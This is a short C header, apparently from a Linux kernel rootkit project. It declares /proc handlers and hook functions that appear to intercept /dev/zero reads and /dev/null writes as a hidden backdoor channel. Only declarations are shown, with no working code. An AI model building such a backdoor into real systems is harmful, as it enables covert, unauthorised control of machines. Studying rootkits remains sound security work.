//
// Created by black on 22-10-12.
//

#ifndef UCAS_ROOTKIT_BACKDOOR_H
#define UCAS_ROOTKIT_BACKDOOR_H

#include <linux/proc_fs.h>

int test_open_proc(struct inode *inode, struct file *file);

int test_release_proc(struct inode *inode, struct file *file);

ssize_t test_read_proc(struct file *filp, char __user *buffer, size_t length, loff_t *offset);

ssize_t test_write_proc(struct file *filp, const char __user *buff, size_t len, loff_t *off);

long HookReadZero(struct pt_regs *regs, long (*pFunction)(const struct pt_regs *));

long HookWriteNull(struct pt_regs *regs, long (*pFunction)(const struct pt_regs *));

ssize_t AfterJumpInWriteNull(struct file *file, const char __user *buf,
                             size_t count, loff_t *ppos);

#endif //UCAS_ROOTKIT_BACKDOOR_H
